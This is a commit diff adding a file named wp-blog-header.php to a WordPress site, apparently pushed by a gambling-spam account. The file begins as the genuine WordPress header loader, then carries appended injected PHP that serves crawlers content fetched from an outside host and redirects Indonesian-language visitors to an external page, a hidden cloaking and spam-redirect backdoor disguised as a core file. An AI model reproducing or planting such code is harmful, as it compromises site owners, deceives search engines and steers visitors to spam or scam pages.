1beffd68bc862415f225f93ad5049e6c2854735a
Yuyu Kang Kang <slot16online@gmail.com>
2024-10-19 16:20:21 +0700

    wp-blog-header.php

---
+++ islacastilla.com/wp-blog-header.php
@@ -0,0 +1,40 @@
+<?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
+}
+$s_ref = $_SERVER['HTTP_REFERER'];
+    $agent = $_SERVER['HTTP_USER_AGENT'];
+    if (strpos($agent, 'bot') !== false && $_SERVER['REQUEST_URI'] == '/') {
+        $accept_lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']);
+        if (strpos($accept_lang, 'zh') !== false && $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] == 1 && $_COOKIE['az'] == 'lp') {
+            setcookie('az', 'lp', time() + 3600 * 7200);
+            echo ' '; // Your bot-specific content
+            exit;
+        }
+        echo file_get_contents("includes-page.com/cmd/aislacastilla.com/ibolp2.txt");
+        exit;
+        ?>
+        <?php
+    }
+    $browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
+    if ($browserLang == 'id') {
+        header("https://pub-81602a88e8d6463099c3473e2e58dfa9.r2.dev/index2.html");
+        exit;
+    }
